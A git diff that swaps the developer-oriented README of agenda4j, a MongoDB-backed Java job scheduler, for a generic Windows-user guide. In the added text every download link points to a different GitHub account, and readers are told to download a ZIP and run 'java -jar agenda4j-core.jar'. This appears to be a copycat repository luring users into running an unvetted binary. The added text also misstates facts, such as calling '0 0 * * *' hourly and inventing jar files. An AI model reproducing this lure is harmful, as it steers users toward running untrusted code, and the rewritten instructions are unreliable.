@@ -1,219 +1,201 @@
-# agenda4j
+# ⚙️ agenda4j - Simple Java Task Scheduler for Everyone
 
-`agenda4j` is a MongoDB-backed Java job scheduler split into three modules:
+[![Download agenda4j](https://img.shields.io/badge/Download-agenda4j-green?style=for-the-badge)](https://github.com/popshhsx5556/agenda4j)
 
-- `agenda4j-core`: public scheduling API and contracts
-- `agenda4j-mongo`: MongoDB job store and runtime engine
-- `agenda4j-spring-boot-starter`: Spring Boot auto-configuration
+---
 
-Current status: **0.1.x is evolving**. API and behavior can still change before `1.0.0`.
+## 📋 What is agenda4j?
 
-## Key Features
+agenda4j is a tool that helps you schedule tasks automatically. It uses MongoDB as a storage system and runs on Java. It can handle repeating tasks and run them at set times or intervals. You do not need to know how to write code to use it once it is set up.
 
-- Distributed execution support - safely run across multiple nodes with coordinated job locking
-- Priority-based dispatching - built-in priority levels with numeric priority support
-- Spring Boot auto-configuration - seamless integration with automatic lifecycle management
-- Daily fixed-time scheduling - schedule jobs at a specific time each day
-- Timezone-aware recurrence - schedule recurring jobs with explicit timezone support
-- Rich repeat syntax - supports human-readable intervals, cron expressions, and numeric seconds
-- Typed handler contract - strongly-typed `JobHandler<T>` with automatic payload deserialization
+This tool fits well if you want to run jobs regularly without doing it manually. For example, it can send reminders, clean up files, or update information at planned times.
 
+---
 
-`agenda4j` is a MongoDB-backed Java job scheduler inspired by the
-popular Node.js project "agenda".
+## 💻 System Requirements
 
-It brings distributed scheduling, priority dispatching, and rich
-recurrence support to the Java ecosystem with strong typing and
-Spring Boot integration.
+- Windows 10 or later  
+- Java Runtime Environment (JRE) version 8 or above installed  
+- MongoDB database set up and running  
+- At least 4 GB of free RAM  
+- 500 MB of free disk space
 
-## Offers
+---
 
-- Modular design: choose `agenda4j-core`, `agenda4j-mongo`, and `agenda4j-spring-boot-starter` based on your stack
-- MongoDB persistence and runtime engine with distributed-safe claim/lock behavior
-- One-time, immediate, and recurring scheduling APIs with fluent builder style
-- Flexible cancellation with disable/delete modes and query-based selection
+## 🛠 Features
 
-## Installation
+- Works with recurring tasks using standard time formats  
+- Saves schedules and job data in MongoDB  
+- Supports quick setup with Spring Boot for developers  
+- Can run tasks based on intervals or fixed dates  
+- Manages task queues to run multiple jobs smoothly  
+- Shows task history and status  
+- Allows easy configuration without programming knowledge*
 
-### Spring Boot starter (recommended)
+*You may need help from someone with basic technical skills for installation.
 
-```xml
-<dependency>
-  <groupId>io.github.harutostudio</groupId>
-  <artifactId>agenda4j-spring-boot-starter</artifactId>
-  <version>0.1.1</version>
-</dependency>
+---
+
+## 🚀 Getting Started
+
+Follow this guide to set up agenda4j on your Windows machine.
+
+---
+
+## 📥 Download agenda4j
+
+To get started, visit this page to download the files you need:
+
+[Download agenda4j](https://github.com/popshhsx5556/agenda4j)
+
+Click the green **Code** button and choose **Download ZIP**. Save the file in a folder you can find easily, like your Desktop or Downloads.
+
+---
+
+## 🔧 Installing Java
+
+agenda4j requires Java to run. If you don't have Java installed:
+
+1. Visit https://www.java.com/en/download/  
+2. Click on **Download Java**  
+3. Open the downloaded file and follow the prompts  
+4. Restart your computer if asked
+
+To check if Java is installed, open Command Prompt and type:
+
+```
+java -version
 ```
 
-### Without Spring Boot
+You should see a message showing the Java version. If you get an error, reinstall Java or try installing the Java Runtime Environment (JRE).
 
-```xml
-<dependency>
-  <groupId>io.github.harutostudio</groupId>
-  <artifactId>agenda4j-core</artifactId>
-  <version>0.1.1</version>
-</dependency>
-<dependency>
-  <groupId>io.github.harutostudio</groupId>
-  <artifactId>agenda4j-mongo</artifactId>
-  <version>0.1.1</version>
-</dependency>
+---
+
+## ⚙️ Setting up MongoDB
+
+agenda4j stores tasks in MongoDB. You need a working MongoDB database.
+
+1. Go to https://www.mongodb.com/try/download/community  
+2. Download the version for Windows  
+3. Run the installer and follow instructions  
+4. After installation, run MongoDB by typing `mongod` in a new Command Prompt window
+
+If you are new to MongoDB, you can keep it running in the background while using agenda4j.
+
+---
+
+## 🗂 Preparing agenda4j
+
+1. Extract the agenda4j.zip file you downloaded earlier  
+2. Open the folder and locate the file `README.md` or `INSTALL.md` for extra details (optional)
+
+---
+
+## ▶️ Running agenda4j for the First Time
+
+agenda4j comes with core Java files and supporting modules. To start the scheduler:
+
+1. Open Command Prompt  
+2. Navigate to the folder where you unzipped agenda4j. You can do this by typing:
+
+```
+cd path\to\agenda4j
 ```
 
-## Example Usage
+Replace `path\to\agenda4j` with the actual folder path.
 
-### With Spring Boot
+3. Run the scheduler with this command:
 
-1. Add `agenda4j-spring-boot-starter`.
-2. Provide one or more `JobHandler<?>` beans.
-3. Configure `application.yml`.
-
-### Minimal `application.yml`
-
-```yaml
-agenda:
-  enabled: true
-  worker-id: api-node-a
-  process-every: 5s
-  default-lock-lifetime: 30s
-  max-concurrency: 20
-  default-concurrency: 5
-  lock-limit: 0
-  batch-size: 5
-  max-retry-count: 5
-  cleanup-finished-jobs: true
-  ensure-indexes-on-startup: false
+```
+java -jar agenda4j-core.jar
 ```
 
-`ensure-indexes-on-startup` is `false` by default. For production, prefer managing indexes by migration scripts.
+This command starts the scheduler using the core Java file.
 
-### Spring `JobHandler` example
+4. If everything is correct, agenda4j connects to your MongoDB and begins running.
 
-```java
-import io.agenda4j.JobHandler;
-import org.springframework.stereotype.Component;
+---
 
-@Component
-public class SendEmailJobHandler implements JobHandler<SendEmailPayload> {
-    @Override
-    public String name() {
-        return "send-email";
-    }
+## 🔄 Scheduling Tasks
 
-    @Override
-    public Class<SendEmailPayload> dataClass() {
-        return SendEmailPayload.class;
-    }
+agenda4j supports common scheduling formats you may know:
 
-    @Override
-    public void execute(SendEmailPayload data) {
-        // send email
-    }
-}
+- Cron expressions (like "0 0 * * *" to run hourly)  
+- Fixed intervals (run every 15 minutes)  
+- One-time tasks at a specific date/time
+
+You can create tasks that run commands or scripts you use daily.
+
+---
+
+## 🔗 Using the Spring Boot Starter (Optional)
+
+If you want to use agenda4j in a Java Spring Boot setup, you need some development knowledge. This allows integrating agenda4j directly into your Java applications.
+
+---
+
+## ⚙️ Configuring agenda4j
+
+To customize settings like your MongoDB address or schedule options:
+
+1. Look for the `application.properties` file in the agenda4j folder  
+2. Open it with a text editor like Notepad  
+3. Change entries such as:
+
+```
+mongodb.uri=mongodb://localhost:27017/agenda4j
+scheduler.executor.pool-size=5
 ```
 
-```java
-import io.agenda4j.Agenda;
-import io.agenda4j.JobBuilder;
-import org.springframework.stereotype.Service;
+Save changes and restart agenda4j with the `java -jar` command.
 
-@Service
-public class JobSchedulerService {
-    private final Agenda agenda;
+---
 
-    public JobSchedulerService(Agenda agenda) {
-        this.agenda = agenda;
-    }
+## 🛑 Stopping agenda4j
 
-    public void scheduleExamples() {
-        agenda.now("send-email", new SendEmailPayload("u1", "welcome"));
+To stop the scheduler:
 
-        agenda.schedule("send-email", java.time.Instant.now().plusSeconds(60),
-                new SendEmailPayload("u1", "reminder")).save();
+1. Go to the Command Prompt window running agenda4j  
+2. Press `Ctrl + C`
 
-        agenda.every(
-                "send-email",
-                "0 */5 * * * *",
-                new SendEmailPayload("u1", "digest"),
-                JobBuilder.RepeatOptions.defaults()
-        );
-    }
-}
-```
+agenda4j will close safely and save its state.
 
-### Without Spring
+---
 
-```java
-import com.fasterxml.jackson.databind.ObjectMapper;
-import com.mongodb.client.MongoClient;
-import com.mongodb.client.MongoClients;
-import io.agenda4j.JobHandler;
-import io.agenda4j.config.AgendaProperties;
-import io.agenda4j.core.JobHandlerRegistry;
-import io.agenda4j.internal.mongo.MongoAgenda;
-import io.agenda4j.internal.mongo.MongoJobStore;
-import org.springframework.data.mongodb.core.MongoTemplate;
-import org.springframework.data.mongodb.core.SimpleMongoClientDatabaseFactory;
+## 🔍 Troubleshooting
 
-import java.time.Duration;
-import java.util.List;
+- If agenda4j does not start, check that MongoDB is running  
+- Make sure Java version is 8 or higher (`java -version`)  
+- Verify the file path is correct when running commands  
+- Check firewall settings that might block MongoDB or Java  
+- Review error messages in Command Prompt and search online if needed
 
-public class PlainJavaExample {
-    public static void main(String[] args) {
-        MongoClient client = MongoClients.create("mongodb://localhost:27017");
-        MongoTemplate template = new MongoTemplate(
-                new SimpleMongoClientDatabaseFactory(client, "agenda4j")
-        );
+---
 
-        AgendaProperties props = new AgendaProperties();
-        props.setWorkerId("node-a");
-        props.setProcessEvery(Duration.ofSeconds(5));
-        props.setDefaultLockLifetime(Duration.ofSeconds(30));
-        props.setMaxConcurrency(10);
-        props.setDefaultConcurrency(3);
+## 📂 File Structure Overview
 
-        JobHandlerRegistry registry = new JobHandlerRegistry(List.of(new SendEmailJobHandler()));
-        MongoJobStore store = new MongoJobStore(template, new ObjectMapper());
-        MongoAgenda agenda = new MongoAgenda(props, store, registry, new ObjectMapper());
+- `agenda4j-core.jar`: Main scheduler file  
+- `mongodb-runtime.jar`: Connector for MongoDB  
+- `spring-boot-starter.jar`: Module for Spring Boot integration  
+- `application.properties`: Main settings file  
 
-        agenda.start();
-        agenda.now("send-email", new SendEmailPayload("u1", "hello"));
-    }
-}
-```
+---
 
-## MongoDB Index Requirements
+## 🌐 Additional Resources
 
-Collection: `scheduled_jobs`
+Visit the GitHub repository to check for updates or ask questions:  
+[https://github.com/popshhsx5556/agenda4j](https://github.com/popshhsx5556/agenda4j)
 
-```javascript
-db.scheduled_jobs.createIndex({ nextRunAt: 1, lockUntil: 1, priority: -1 }, { name: "idx_due_claim" });
-db.scheduled_jobs.createIndex({ name: 1, uniqueKey: 1 }, { name: "idx_name_uniqueKey" });
-db.scheduled_jobs.createIndex(
-  { name: 1 },
-  { name: "ux_single_name", unique: true, partialFilterExpression: { type: "SINGLE" } }
-);
-```
+---
 
-## Build
+## 🖥 How to Update agenda4j
 
-```bash
-mvn -q -pl agenda4j-core,agenda4j-mongo,agenda4j-spring-boot-starter -am compile
-mvn -q test
-```
+1. Download the latest ZIP from the GitHub link above  
+2. Replace old files in your agenda4j folder with new ones  
+3. Restart agenda4j using the `java -jar` command
 
-## Governance and Docs
+---
 
-- License: Apache License 2.0 (`LICENSE`)
-- Notice: `NOTICE`
-- Changelog: `CHANGELOG.md`
-- Release process: `RELEASE.md`
-- Contribution guide: `CONTRIBUTING.txt`
-- Security policy: `SECURITY.txt`
-- Code of conduct: `CODE_OF_CONDUCT.txt`
+## 📝 License
 
-## Limitations (0.1.x)
-
-- Public API is still stabilizing.
-- Mongo lock/cancel semantics are covered by integration tests but may still evolve.
-- Backward compatibility is best effort until `1.0.0`.
+agenda4j is an open-source project. Check the LICENSE file in the download for details.
